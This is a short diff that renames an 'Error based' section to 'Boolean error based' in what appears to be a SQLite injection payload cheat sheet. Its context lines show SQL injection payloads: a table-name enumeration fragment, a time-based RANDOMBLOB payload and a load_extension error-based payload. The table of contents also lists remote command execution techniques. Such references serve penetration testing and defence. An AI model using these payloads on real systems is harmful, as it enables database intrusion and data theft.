@@ -11,7 +11,7 @@
 * [Boolean - Enumerating table name](#boolean---enumerating-table-name)
 * [Boolean - Extract info](#boolean---extract-info)
 * [Time based](#time-based)
-* [Error based](#error-based)
+* [Boolean error based](#boolean-error-based)
 * [Remote Command Execution using SQLite command - Attach Database](#remote-command-execution-using-sqlite-command---attach-database)
 * [Remote Command Execution using SQLite command - Load_extension](#remote-command-execution-using-sqlite-command---load_extension)
 * [References](#references)
@@ -78,7 +78,7 @@ and (SELECT hex(substr(tbl_name,1,1)) FROM sqlite_master WHERE type='table' and 
 AND [RANDNUM]=LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB([SLEEPTIME]00000000/2))))
 ```
 
-## Error based
+## Boolean error based
 
 ```sql
 AND CASE WHEN [BOOLEAN_QUERY] THEN 1 ELSE load_extension(1) END
